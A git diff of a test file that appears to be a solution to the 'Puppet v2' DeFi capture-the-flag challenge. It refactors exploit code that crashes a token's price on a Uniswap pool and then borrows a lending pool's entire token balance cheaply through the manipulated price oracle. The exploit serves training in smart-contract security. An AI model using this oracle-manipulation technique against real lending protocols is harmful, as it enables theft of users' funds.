@@ -115,44 +115,32 @@ describe("[Challenge] Puppet v2", function () {
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
 
+    //connect attacker to contracts
     const routerAttackerConnected = await this.uniswapRouter.connect(attacker);
-    const exchangeAttackerConnected = await this.uniswapExchange.connect(
-      attacker
-    );
     const tokenAttackerConnected = await this.token.connect(attacker);
     const wethAttackerConnected = await this.weth.connect(attacker);
     const poolAttackerConnected = await this.lendingPool.connect(attacker);
-
     const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+
+    //dump token price
     await tokenAttackerConnected.approve(
       routerAttackerConnected.address,
       ATTACKER_INITIAL_TOKEN_BALANCE
     );
     await routerAttackerConnected.swapExactTokensForETH(
-      ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+      ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), //keep one token
       1,
       [this.token.address, this.weth.address],
       attacker.address,
       deadline
     );
-    const tokenBalance = await this.token.balanceOf(
-      this.uniswapExchange.address
-    );
-    const wethBalance = await this.weth.balanceOf(this.uniswapExchange.address);
-    const wethDeposit = await routerAttackerConnected.quote(
-      POOL_INITIAL_TOKEN_BALANCE,
-      tokenBalance,
-      wethBalance
-    );
-    const ethAmount = await ethers.provider.getBalance(attacker.address);
-    const depositEth = ethAmount.sub("100000000000000000"); //0.1 eth
-    console.log(
-      ethers.utils.formatEther(wethDeposit),
-      ethers.utils.formatEther(ethAmount),
-      ethers.utils.formatEther(depositEth)
-    );
 
+    //swap eth for weth
+    const ethAmount = await ethers.provider.getBalance(attacker.address);
+    const depositEth = ethAmount.sub("100000000000000000"); //0.1 eth; keep some eth for fees
     await wethAttackerConnected.deposit({ value: depositEth });
+
+    //borrow all tokens from the pool
     await wethAttackerConnected.approve(this.lendingPool.address, depositEth);
     await poolAttackerConnected.borrow(POOL_INITIAL_TOKEN_BALANCE);
   });
